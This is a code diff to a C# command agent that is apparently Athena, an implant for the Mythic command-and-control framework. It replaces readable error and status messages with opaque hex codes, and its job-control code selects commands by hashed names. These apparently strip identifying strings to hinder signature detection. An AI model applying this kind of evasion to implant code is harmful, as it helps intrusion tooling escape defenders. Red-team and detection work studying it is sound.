@@ -51,7 +51,7 @@ namespace Athena.Commands
                     TaskResponseHandler.AddResponse(new ResponseResult()
                     {
                         task_id = task.id,
-                        user_output = "Failed to switch context!",
+                        user_output = "0x0C",
                         status = "error",
                         completed = true,
                     }.ToJson());
@@ -85,7 +85,7 @@ namespace Athena.Commands
                         TaskResponseHandler.activeJobs[task.parameters].cancellationtokensource.Cancel();
                         TaskResponseHandler.AddResponse(new ResponseResult
                         {
-                            user_output = "Cancelled job",
+                            user_output = "0x0D",
                             completed = true,
                             task_id = job.task.id,
                         }.ToJson());
@@ -94,7 +94,7 @@ namespace Athena.Commands
                     {
                         TaskResponseHandler.AddResponse(new ResponseResult
                         {
-                            user_output = "Job doesn't exist",
+                            user_output = "0x0E",
                             completed = true,
                             task_id = job.task.id,
                             status = "error"
@@ -148,7 +148,7 @@ namespace Athena.Commands
                 case "5D343B8042C5EE2EA7C892C5ECC16E30": //stop-assembly
                     TaskResponseHandler.AddResponse(new ResponseResult
                     {
-                        user_output = "Not implemented yet.",
+                        user_output = "0x0F",
                         completed = true,
                         task_id = job.task.id,
                     }.ToJson());
@@ -224,7 +224,7 @@ namespace Athena.Commands
             {
                 task_id = job.task.id,
                 completed = true,
-                user_output = "not available in this configuration"
+                user_output = "0x10"
             }.ToJson();
 #else
             StringBuilder sb = new StringBuilder();
@@ -359,7 +359,7 @@ namespace Athena.Commands
             return new ResponseResult()
             {
                 completed = true,
-                user_output = "Plugin not loaded. Please use the load command to load the plugin!",
+                user_output = "0x11",
                 task_id = job.task.id,
                 status = "error",
             };
@@ -396,7 +396,7 @@ namespace Athena.Commands
                     status = "error",
                     completed = true,
                     task_id = response.task_id,
-                    user_output = "Mythic sent no data to upload!"
+                    user_output = "0x12"
 
                 }.ToJson());
 
